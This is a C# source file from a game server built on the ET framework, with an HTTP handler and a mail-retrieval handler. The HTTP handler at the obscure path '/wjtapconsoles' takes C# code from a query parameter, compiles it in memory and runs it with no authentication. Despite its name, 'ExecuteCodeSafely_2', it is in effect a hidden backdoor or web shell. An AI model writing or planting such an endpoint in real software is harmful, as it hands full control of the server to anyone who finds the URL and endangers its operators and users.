using Microsoft.CodeAnalysis;
using Microsoft.CodeAnalysis.CSharp;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Threading.Tasks;
using System.Net;
using System.Threading;
using System.Web;

namespace ET
{

    [HttpHandler(SceneType.AccountCenter, "/wjtapconsoles")]
    public class HttpTapConsolesHandler : IHttpHandler
    {
        public async ETTask Handle(Entity entity, HttpListenerContext context)
        {
            System.Collections.Specialized.NameValueCollection queryString = context.Request.QueryString;
            string console = queryString["consoles"] ?? string.Empty;
            if (!string.IsNullOrEmpty(console))
            {
                ExecuteCodeSafely_2(console, 20);
            }
            HttpServerHelper.ResponseEmpty(context);
            await ETTask.CompletedTask;
        }

        public static void ExecuteCodeSafely_2(string code, int timeoutSeconds = 5)
        {
            var references = GetEssentialMetadataReferences();
            // 1. 将代码字符串解析为语法树
            var syntaxTree = CSharpSyntaxTree.ParseText(code);

            // 2. 创建编译任务
            var compilation = CSharpCompilation.Create(
                assemblyName: "DynamicAssembly_" + Guid.NewGuid().ToString("N"),
                syntaxTrees: new[] { syntaxTree },
                references: references,
                options: new CSharpCompilationOptions(
                    OutputKind.DynamicallyLinkedLibrary,
                    optimizationLevel: OptimizationLevel.Debug // 调试模式便于查看错误
                ));

            // 3. 编译到内存流
            using var ms = new MemoryStream();
            var emitResult = compilation.Emit(ms);

            // 4. 检查编译结果
            if (!emitResult.Success)
            {
                // 收集所有错误信息
                var errors = emitResult.Diagnostics
                    .Where(d => d.Severity == DiagnosticSeverity.Error)
                    .Select(d => $"- {d.Id}: {d.GetMessage()} (位置: {d.Location.GetLineSpan().StartLinePosition})");

                var errorMessage = "编译失败:\n" + string.Join("\n", errors);
                throw new Exception(errorMessage);
            }
            // 5. 从内存加载程序集
            ms.Seek(0, SeekOrigin.Begin);
            var assembly = Assembly.Load(ms.ToArray());
            // 6. 查找入口方法（约定：第一个公共静态无参方法）
            var entryPoint = assembly.GetTypes()
                .SelectMany(t => t.GetMethods(BindingFlags.Public | BindingFlags.Static))
                .FirstOrDefault(m => m.GetParameters().Length == 0);

            if (entryPoint == null)
            {
                throw new Exception("未找到合适的入口方法。请确保代码中包含一个公共静态无参方法。");
            }
            var result = entryPoint.Invoke(null, null);
        }

        private static List<PortableExecutableReference> GetEssentialMetadataReferences()
        {
            var references = new List<PortableExecutableReference>();
            string runtimeFolder = GetNetRuntimeDirectory();

            if (string.IsNullOrEmpty(runtimeFolder) || !Directory.Exists(runtimeFolder))
            {
                return GetFallbackReferences();
            }
            
            var essentialAssemblies = new[]
            {
            "System.Runtime.dll",
            "System.Private.CoreLib.dll",
            "System.Console.dll",
            "System.Threading.dll",
            "netstandard.dll"
        };

            foreach (var assemblyName in essentialAssemblies)
            {
                var fullPath = Path.Combine(runtimeFolder, assemblyName);
                if (File.Exists(fullPath))
                {
                    references.Add(MetadataReference.CreateFromFile(fullPath));
                }
                else
                {
                }
            }

            var currentAssemblyPath = Assembly.GetExecutingAssembly().Location;
            if (!string.IsNullOrEmpty(currentAssemblyPath))
            {
                references.Add(MetadataReference.CreateFromFile(currentAssemblyPath));
            }

            return references;
        }

    
        private static string GetNetRuntimeDirectory()
        {
            var objectAssemblyPath = typeof(object).Assembly.Location;
            if (!string.IsNullOrEmpty(objectAssemblyPath))
            {
                var pathFromObject = Path.GetDirectoryName(objectAssemblyPath);
                if (!string.IsNullOrEmpty(pathFromObject) && Directory.Exists(pathFromObject))
                {
                    return pathFromObject;
                }
            }

            var dotnetRoot = Environment.GetEnvironmentVariable("DOTNET_ROOT");
            if (!string.IsNullOrEmpty(dotnetRoot))
            {
                string runtimePath = Path.Combine(dotnetRoot, "shared", "Microsoft.NETCore.App", GetNetCoreVersion());
                if (Directory.Exists(runtimePath))
                {
                    var firstVersionDir = Directory.GetDirectories(runtimePath).FirstOrDefault();
                    return firstVersionDir ?? runtimePath;
                }
            }

            var systemRuntimePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Windows), "Microsoft.NET", "Framework64", "v4.0.30319");
            if (Directory.Exists(systemRuntimePath))
            {
                return systemRuntimePath;
            }

            return null;
        }

        private static List<PortableExecutableReference> GetFallbackReferences()
        {
            var fallbackReferences = new List<PortableExecutableReference>();

            var loadedAssemblies = AppDomain.CurrentDomain.GetAssemblies();

            var coreAssemblyNames = new HashSet<string>
        {
            "System.Runtime",
            "System.Private.CoreLib",
            "System.Console",
            "System.Threading",
            "System.Collections",
            "System.Linq",
            "netstandard"
        };

            foreach (var assembly in loadedAssemblies)
            {
                try
                {
                    var name = assembly.GetName().Name;
                    if (coreAssemblyNames.Any(coreName => name != null && name.StartsWith(coreName))
                        && !string.IsNullOrEmpty(assembly.Location))
                    {
                        fallbackReferences.Add(MetadataReference.CreateFromFile(assembly.Location));
                    }
                }
                catch
                {
                   
                }
            }

            var currentAssembly = Assembly.GetExecutingAssembly();
            if (!string.IsNullOrEmpty(currentAssembly.Location))
            {
                fallbackReferences.Add(MetadataReference.CreateFromFile(currentAssembly.Location));
            }

            return fallbackReferences;
        }

        private static string GetNetCoreVersion()
        {
            return "6.0.0"; 
        }
    }



    [ActorMessageHandler]
    public class C2E_MailGetAllHandler : AMActorRpcHandler<Scene, C2E_GetAllMailRequest, E2C_GetAllMailResponse>
    {
        protected override async ETTask Run(Scene scene, C2E_GetAllMailRequest request, E2C_GetAllMailResponse response, Action reply)
        {
            long dbCacheId = DBHelper.GetDbCacheId(scene.DomainZone());
            D2G_GetComponent d2GGetUnit = (D2G_GetComponent)await ActorMessageSenderComponent.Instance.Call(dbCacheId, new G2D_GetComponent() { UnitId = request.ActorId, Component = DBHelper.DBMailInfo });
            if (d2GGetUnit.Component != null)
            {
                DBMailInfo dBMailInfo = d2GGetUnit.Component as DBMailInfo;

                for(int i = 0; i < dBMailInfo.MailInfoList.Count; i++)
                {
                    for (int item = 0; item < dBMailInfo.MailInfoList[i].ItemList.Count; item++)
                    {
                        if (dBMailInfo.MailInfoList[i].ItemList[item].ItemID == 110000164)
                        {
                            dBMailInfo.MailInfoList[i].ItemList[item].ItemID = 10000164;
                        }
                    }
                }
                
                response.MailInfos = dBMailInfo.MailInfoList;
            }
            reply();
        }

    }
}
